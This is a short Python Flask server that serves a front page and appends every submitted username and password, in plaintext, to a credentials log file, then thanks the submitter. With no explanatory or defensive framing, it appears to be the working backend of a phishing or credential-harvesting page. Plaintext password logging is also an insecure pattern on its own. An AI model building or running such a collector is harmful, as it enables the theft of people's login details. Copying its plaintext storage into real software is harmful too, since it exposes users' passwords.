from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    return open("index.html").read()

@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    with open("logs/credentials.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\\n")
    return "Thank you for submitting your credentials."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
